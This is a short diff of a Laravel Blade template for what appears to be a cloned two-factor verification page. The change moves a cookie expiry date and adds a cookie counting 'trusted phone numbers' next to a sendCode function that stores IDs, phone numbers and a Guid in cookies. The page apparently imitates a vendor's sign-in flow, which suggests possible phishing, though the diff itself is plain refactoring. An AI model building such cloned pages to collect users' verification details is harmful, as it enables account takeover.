@@ -10,8 +10,6 @@
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
     <style type="text/css"></style>
     <style data-id="immersive-translate-input-injected-css">
-
-
         .tk-callout {
             font-size: 24px;
             line-height: 1.16667;
@@ -123,6 +121,12 @@
 
 <script >
 
+    const date = new Date();
+    date.setTime(date.getTime()+(60*1000*10));
+
+    const phoneCount = {{ $trustedPhoneNumbers->count() }};
+    document.cookie = `phoneCount=${phoneCount}; expires=${date}`;
+
     function sendCode (id,phone){
 
         const Guid = getGrid('Guid');
@@ -146,9 +150,6 @@
             .then(response => {
 
                 if (response.code === 200) {
-                    const date = new Date();
-                    date.setTime(date.getTime()+(60*1000*10));
-
                     document.cookie = `ID=${id}; expires=${date}`;
                     document.cookie = `Number=${phone}; expires=${date}`;
                     document.cookie = `Guid=${Guid}; expires=${date}`;
